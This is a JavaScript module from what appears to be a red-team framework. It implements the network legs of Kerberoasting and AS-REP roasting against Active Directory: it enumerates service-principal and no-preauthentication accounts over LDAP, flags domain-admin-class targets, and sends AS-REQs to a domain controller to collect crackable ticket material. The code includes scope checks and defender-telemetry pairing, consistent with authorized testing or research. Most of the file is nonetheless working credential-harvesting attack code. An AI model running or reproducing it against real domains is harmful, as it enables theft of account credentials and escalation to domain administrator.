// VARVEL — the GOVERNED AD TIER, rung 1 I/O shell: the network legs of the roast
// collectors (the PURE core — planner, DER, formats, gates — is engine/adroast.mjs).
//
//   * ldapRoastSearch  — the SPN / DONT_REQ_PREAUTH enumeration: an authenticated
//     (or anonymous) LDAP simple bind + a subtree search executing EXACTLY the plan
//     engine/adroast.mjs planned (the filter bytes are the planner's). Reuses the
//     ldapenum BER plumbing (tools/ldapenum.mjs), never duplicates it.
//   * asrepExchange    — the ASREP-roast wire: engine-built AS-REQ bytes to the DC
//     over TCP/88 (4-byte length framing), AS-REP bytes back. No credentials, no
//     crypto — that absence is the DONT_REQ_PREAUTH mechanic.
//   * detectDc         — the honest lab-topology probe: rootDSE via the existing
//     ldapEnum + a Kerberos port probe. The guarded live tests gate on this and
//     SKIP CLEANLY when the range has no DC (the standalone-Win11 lab case).
//
// SCOPE DISCIPLINE: callers pass the engagement's signed cidrs; a DC outside the
// ring is refused loudly BEFORE any wire traffic (the same fail-closed rule the
// channel enforces on agent-tasked collection).
//
// edrview PAIRING (mandatory doctrine): the ticket requests are ordinary Kerberos
// traffic — the tradecraft point — so the measure is what the defender LOGGED.
// roastEdrMarkers() builds the marker set for tools/edrview.mjs assessEdrView
// (DC Security 4768/4769 where the range has a DC; the agent host's telemetry
// otherwise). The verdict is the oracle's, never a claim.

import net from 'node:net';
import { ldapEnum, tlv, berSeq, berInt, berOctet, peelMessage, parseEnvelope, parseResult, parseEntry } from './ldapenum.mjs';
import { buildRoastSearchRequest, buildAsReq, parseAsRep, parseKrbError, ADROAST_DEFAULT_ETYPES } from '../engine/adroast.mjs';
import { lateralScopeCheck } from '../engine/lateralexec.mjs';
import { parseIp } from '../engine/ipaddr.mjs';

const TAG = { BIND_REQ: 0x60, BIND_RES: 0x61, SEARCH_ENTRY: 0x64, SEARCH_DONE: 0x65, SIMPLE_AUTH: 0x80 };

// A simple bind WITH credentials (ldapenum ships anonymous only — same codec).
function buildAuthBindRequest(messageId, name, password) {
  return berSeq(berInt(messageId), tlv(TAG.BIND_REQ, Buffer.concat([
    berInt(3), berOctet(String(name || '')), tlv(TAG.SIMPLE_AUTH, Buffer.from(String(password || ''), 'utf8')),
  ])));
}

const attr = (attrs, name) => {
  const k = Object.keys(attrs || {}).find((x) => x.toLowerCase() === name.toLowerCase());
  return k ? attrs[k] : [];
};
const DA_GROUP_RE = /\b(domain admins|enterprise admins|administrators)\b/i;

// Map one LDAP entry to the roast account shape (the same shape the agent's
// ==ADROAST-LIB== enum emits — one evidence vocabulary across both legs).
export function entryToAccount(attrs, { wantSpns }) {
  const user = attr(attrs, 'sAMAccountName')[0] || null;
  if (!user) return null;
  const spns = attr(attrs, 'servicePrincipalName');
  if (wantSpns && !spns.length) return null;
  const uac = Number(attr(attrs, 'userAccountControl')[0] || 0);
  const groups = attr(attrs, 'memberOf');
  const adminCount = attr(attrs, 'adminCount')[0] === '1' ? 1 : 0;
  return {
    user, spns: wantSpns ? spns : [],
    adminCount,
    daClass: adminCount === 1 || groups.some((g) => DA_GROUP_RE.test(g)),
    groups: groups.slice(0, 16),
    disabled: (uac & 2) !== 0, // ACCOUNTDISABLE — the plan filters these server-side; belt-and-braces mapping
  };
}

// The enumeration session. Never throws for network/protocol failures.
//   host     — the DC (IP literal inside the signed ring when cidrs are passed)
//   plan     — planLdapTargeting('spn-accounts' | 'no-preauth-accounts')
//   bindDN/password — operator-supplied (user@realm or DOMAIN\user); empty = anonymous
//   baseDN   — the search base (defaultNamingContext from detectDc); required
export async function ldapRoastSearch(host, { plan, bindDN = '', password = '', baseDN, cidrs = null, timeout = 6000, connectImpl } = {}) {
  if (!host) throw new Error('ldapRoastSearch: host is required');
  if (!plan || !plan.filter) throw new Error('ldapRoastSearch: plan is required (engine/adroast planLdapTargeting)');
  if (cidrs) {
    const sc = lateralScopeCheck(host, cidrs, 'dc');
    if (!sc.ok) return { host, ok: false, refused: true, verdict: sc.reason, accounts: [], evidence: [] };
  }
  if (!baseDN) return { host, ok: false, refused: false, verdict: 'no baseDN — run detectDc first (rootDSE defaultNamingContext)', accounts: [], evidence: [] };
  const connect = connectImpl || netConnect;
  let sock;
  try { sock = await connect(host, 389, timeout); } catch (e) {
    return { host, ok: false, refused: false, verdict: 'no LDAP service (' + ((e && e.message) || e) + ')', accounts: [], evidence: [] };
  }
  const state = { buf: Buffer.alloc(0), queue: [], waiters: [] };
  sock.onData((d) => {
    state.buf = Buffer.concat([state.buf, d]);
    for (;;) {
      const peeled = peelMessage(state.buf);
      if (!peeled) break;
      state.buf = peeled.rest;
      const msg = parseEnvelope(peeled.message);
      const w = state.waiters.shift();
      if (w) w(msg); else state.queue.push(msg);
    }
  });
  const next = () => new Promise((res) => {
    if (state.queue.length) return res(state.queue.shift());
    state.waiters.push(res);
    setTimeout(() => { const i = state.waiters.indexOf(res); if (i >= 0) { state.waiters.splice(i, 1); res(null); } }, timeout);
  });
  const finish = (obj) => { try { sock.end(); } catch {} return obj; };
  const evidence = [];

  sock.write(buildAuthBindRequest(1, bindDN, password));
  const bindRes = await next();
  if (!bindRes || bindRes.opTag !== TAG.BIND_RES) return finish({ host, ok: false, refused: false, verdict: 'malformed bind response', accounts: [], evidence });
  const bind = parseResult(bindRes.opValue);
  if (bind.resultCode !== 0) {
    evidence.push('bind refused: resultCode ' + bind.resultCode + ' (' + (bind.diagnostic || 'no diagnostic') + ')');
    return finish({ host, ok: false, refused: false, verdict: 'directory refused the bind (' + (bindDN ? 'supplied creds' : 'anonymous') + ') — said plainly', accounts: [], evidence });
  }
  evidence.push('bind accepted (' + (bindDN ? 'operator-supplied creds' : 'anonymous') + ')');

  sock.write(buildRoastSearchRequest(2, baseDN, plan));
  const accounts = [];
  let done = null;
  for (;;) {
    const m = await next();
    if (!m) { done = 'search timed out mid-read'; break; }
    if (m.opTag === TAG.SEARCH_ENTRY) {
      const entry = parseEntry(m.opValue);
      const acc = entryToAccount(entry.attributes, { wantSpns: plan.which === 'spn-accounts' });
      if (acc && !acc.disabled) accounts.push(acc);
      continue;
    }
    if (m.opTag === TAG.SEARCH_DONE) {
      const d = parseResult(m.opValue);
      done = d.resultCode === 0 ? 'ok' : 'search done resultCode ' + d.resultCode + ' (' + (d.diagnostic || 'ok') + ')';
      break;
    }
  }
  evidence.push('filter ' + plan.filter + ' -> ' + accounts.length + ' account(s)');
  return finish({
    host, ok: done === 'ok', refused: false, verdict: done, accounts, evidence,
    note: accounts.length + ' ' + plan.which + ' collected — LDAP targeting only; no ticket was requested by this leg',
  });
}

// The ASREP exchange: one TCP/88 conversation per account. requests =
// [{user, asreq}] with asreq a Buffer from buildAsReq (engine-built DER — the shell
// never hand-rolls request bytes). KRB-ERROR answers (PREAUTH_REQUIRED above all:
// the account is NOT roastable) land as honest per-account outcomes.
export async function asrepExchange(dc, { requests, timeout = 6000, connectImpl } = {}) {
  if (!dc) throw new Error('asrepExchange: dc is required');
  if (!Array.isArray(requests) || !requests.length) throw new Error('asrepExchange: requests are required');
  const connect = connectImpl || netConnect;
  const out = [];
  for (const r of requests) {
    const user = String(r.user || '');
    const bytes = Buffer.isBuffer(r.asreq) ? r.asreq : Buffer.from(String(r.asreqB64 || ''), 'base64');
    try {
      const sock = await connect(dc, 88, timeout);
      const framed = Buffer.concat([(() => { const b = Buffer.alloc(4); b.writeUInt32BE(bytes.length, 0); return b; })(), bytes]);
      const reply = await new Promise((resolve, reject) => {
        let buf = Buffer.alloc(0);
        const timer = setTimeout(() => { try { sock.end(); } catch {} reject(new Error('KDC read timeout')); }, timeout);
        sock.onData((d) => {
          buf = Buffer.concat([buf, d]);
          if (buf.length >= 4) {
            const want = buf.readUInt32BE(0);
            if (buf.length >= 4 + want) { clearTimeout(timer); try { sock.end(); } catch {} resolve(buf.subarray(4, 4 + want)); }
          }
        });
        sock.onClose(() => { clearTimeout(timer); reject(new Error('KDC closed mid-read')); });
        sock.write(framed);
      });
      out.push({ user, asrepB64: reply.toString('base64') });
    } catch (e) {
      out.push({ user, error: ((e && e.message) || String(e)).slice(0, 200) });
    }
  }
  return out;
}

// Build the adroast-asrep task data (the agent's raw-TCP leg replays exactly these
// engine-built request bytes). users = DONT_REQ_PREAUTH accounts from the enum.
export function buildAsrepTaskData({ dc, realm, users, etypes = ADROAST_DEFAULT_ETYPES }) {
  const requests = (users || []).map((user) => ({ user: String(user), asreqB64: buildAsReq({ user, realm, etypes }).toString('base64') }));
  return JSON.stringify({ dc: String(dc), realm: String(realm).toUpperCase(), requests });
}

// The honest lab-topology probe: rootDSE via the existing ldapEnum + a Kerberos
// TCP/88 probe. isDc is claimed ONLY on AD evidence (rootDSE functionality levels);
// a standalone range box reports isDc:false plainly — the guarded live tests skip
// on exactly this.
export async function detectDc(host, { timeout = 4000, connectImpl } = {}) {
  if (!host) throw new Error('detectDc: host is required');
  const ldap = await ldapEnum(host, { timeout, connectImpl });
  let krbOpen = null;
  try {
    const sock = await (connectImpl || netConnect)(host, 88, timeout);
    krbOpen = true;
    try { sock.end(); } catch {}
  } catch { krbOpen = false; }
  const realm = ldap.defaultNamingContext
    ? ldap.defaultNamingContext.split(',').map((p) => p.trim()).filter((p) => /^DC=/i.test(p)).map((p) => p.slice(3)).join('.').toUpperCase() || null
    : null;
  const isAD = ldap.vendorGuess === 'active-directory';
  return {
    host, isDc: isAD === true, kerberosOpen: krbOpen, realm,
    dnsHostName: ldap.dnsHostName || null, baseDN: ldap.defaultNamingContext || null,
    verdict: isAD
      ? 'Active Directory DC evidence at ' + host + ' (realm ' + (realm || '?') + ', kerberos ' + (krbOpen ? 'open' : krbOpen === false ? 'closed/filtered' : 'unprobed') + ')'
      : 'no AD evidence at ' + host + ' (' + ldap.verdict + ') — the range is a standalone box; roast collectors validate HERMETICALLY here',
    ldap,
  };
}

// The edrview pairing marker set for a roast run: SPNs, users, and the DC — the
// strings the defender's telemetry would render (4768/4769 messages name the SPN
// and account). Feed to tools/edrview.mjs assessEdrView({ markers }).
export function roastEdrMarkers(fields) {
  const markers = [];
  for (const h of (fields && fields.hashes) || []) {
    if (h.spn) markers.push(h.spn);
    if (h.user) markers.push(h.user);
  }
  for (const a of (fields && fields.accounts) || []) if (a.user) markers.push(a.user);
  if (fields && fields.dc) markers.push(fields.dc);
  return [...new Set(markers.map(String))].slice(0, 64);
}

function netConnect(host, port, timeout) {
  return new Promise((resolve, reject) => {
    const sock = net.connect({ host, port, timeout });
    const onErr = (e) => { reject(e); };
    sock.once('error', onErr);
    sock.on('connect', () => {
      sock.removeListener('error', onErr);
      resolve({
        write: (d) => sock.write(d),
        end: () => sock.end(),
        onData: (cb) => sock.on('data', cb),
        onClose: (cb) => sock.on('close', cb),
      });
    });
  });
}

export const __internals = { buildAuthBindRequest, netConnect };
